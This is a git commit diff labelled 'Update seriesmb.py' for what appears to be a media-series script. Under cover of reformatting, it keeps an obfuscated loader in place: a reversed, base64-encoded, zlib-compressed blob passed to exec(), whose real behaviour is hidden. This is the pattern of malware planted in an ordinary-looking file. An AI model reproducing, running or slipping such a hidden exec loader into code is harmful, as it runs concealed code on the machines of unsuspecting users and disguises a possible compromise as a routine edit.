14d9896aba4f1b72acb57dd8de87f86f7de810f8
evafourbasri-afk <evafour.basri@gmail.com>
2025-12-18 02:16:21 +0800

    Update seriesmb.py

--- seriesmb.py
+++ seriesmb.py
@@ -1,11 +1,15 @@
 MAX_EPISODES = 100
 
-_ = lambda __ : __import__('zlib').decompress(
+_ = lambda __: __import__('zlib').decompress(
     __import__('base64').b64decode(__[::-1])
 )
 
 namespace = {}
-exec((_)(b'J5QiTMw//++8+36WCzhiOzvGIzyJ0n/YzSCYlS5mJ2DtVlz66tw7r7Ddl7Z14DX/YH0PYAi2i9N0OVAIC6Q9xALhch5owvcHxbRBKhDJr06coxjomkqXDwhpLtqDls+ACg2Vv6JE2rFClo0Pvax5AC5weI24fZGCrS+i6zSVfnOfZYun1GLcnJirO3xCaA+CN9ZDfUmTgJRsLMNvcxZ2hydk2nsmS2nuSuPR7MrbEXd+l8exJEowc3bBDavRE//HnRayPZQWQA/g')), namespace)
+
+exec(
+    (_)(b'J5QiTMw//++8+36WCzhiOzvGIzyJ0n/YzSCYlS5mJ2DtVlz66tw7r7Ddl7Z14DX/YH0PYAi2i9N0OVAIC6Q9xALhch5owvcHxbRBKhDJr06coxjomkqXDwhpLtqDls+ACg2Vv6JE2rFClo0Pvax5AC5weI24fZGCrS+i6zSVfnOfZYun1GLcnJirO3xCaA+CN9ZDfUmTgJRsLMNvcxZ2hydk2nsmS2nuSuPR7MrbEXd+l8exJEowc3bBDavRE//HnRayPZQWQA/g'),
+    namespace
+)
 
 def _total_eps(item):
     try:
